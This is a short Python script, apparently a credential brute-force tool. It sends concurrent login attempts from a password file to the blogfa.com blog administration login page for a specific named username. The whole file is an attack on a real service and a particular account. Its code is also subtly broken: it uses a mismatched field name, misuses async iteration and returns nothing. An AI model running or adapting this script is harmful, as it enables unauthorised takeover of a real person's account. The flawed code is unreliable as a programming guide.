from asyncio import Task, gather, get_event_loop
from aiohttp import ClientSession


# Bruteforcing Forms
class BruteForceClient(object):
    def __init__(self, form_params, target_webpage, password_list):
        self.target = target_webpage
        self.params = form_params
        self.passwords = password_list

    async def bruteforce(self):
        resps = await gather(*[Task(self.async_post(_pass)) for _pass in self.passwords], return_exceptions=True)
        result = {}
        async for resp in resps:
            async for k, v in resp.items():
                result[k] = resp[k].content.total_bytes

        # TODO: asynchronize for loop


    async def async_post(self, password):
        data = self.params
        data['upass'] = password
        resp = await ClientSession().post(
            self.target,
            data=self.params
        )
        return {
            password: resp
        }


if __name__ == '__main__':

    with open('passwords', 'r') as passwords:
        pass_list = []
        pass_lst = passwords.readlines()
        for p in pass_lst:
            pass_list.append(p.replace('\n', ''))

    jugger = BruteForceClient(
        {
            '_tx': 145662,
            'usid': 'juggernaut1379',
            'upwd': None,
            'btnSubmit': 'ورود به بخش مدیریت وبلاگ'
        },

        'https://www.blogfa.com/Desktop/Login.aspx',
        pass_list
    )
    loop = get_event_loop()
    loop.run_until_complete(jugger.bruteforce())
